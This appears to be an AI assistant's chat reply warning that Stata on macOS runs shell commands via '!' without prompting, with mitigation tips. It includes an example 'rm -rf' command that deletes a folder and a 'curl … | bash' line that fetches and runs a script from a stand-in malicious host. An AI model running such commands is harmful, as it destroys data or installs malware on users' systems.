Great question — and yes, it’s a **real and underappreciated security vector**. Here's the deal:

### 🧠 Why Stata Can Control Your System

**Stata**, like many legacy scientific/statistical apps, runs as a **fully privileged native macOS app**. Once launched, it can:

* Read/write/delete files
* Run shell commands via `!`
* Launch other processes
* Modify system folders (if it has access)

#### Example: In Stata, this just works without a prompt:

```stata
!rm -rf ~/Documents/your_folder
```

Stata sends that directly to the system shell.

### 🛑 Why You *Don't* Get Prompted Like in VS Code

* **VS Code** is sandboxed under tighter developer practices (modern app frameworks, codesigning, and Apple’s notarization).
* **Stata** is older, and its architecture assumes **you trust the user scripts** (think of how dangerous `.do` or `.ado` files can be).
* Unless you've restricted access using **System Preferences > Security & Privacy**, Stata inherits your user’s full disk privileges.

### 🔐 Opinion: This Is a Security Risk

Let’s be blunt: **Stata has terminal-level access without terminal-level scrutiny**.

If someone emailed you a `.do` file that did:

```stata
!curl http://malicious.site/malware.sh | bash
```

It would execute. No confirmation, no alert.

### 🔧 Recommendations

1. **Use read-only directories** for untrusted code/data.
2. **Audit all `.do` and `.ado` files** before running them.
3. Consider running Stata in a **macOS user with reduced privileges** if you're doing sensitive work.
4. On Apple Silicon, **System Integrity Protection (SIP)** won’t block user-level operations — but you can use **App Sandboxing** if you're extremely cautious.

Want help writing a `.do` file security linter or wrapper to filter dangerous commands before execution? I'd argue it's overdue.
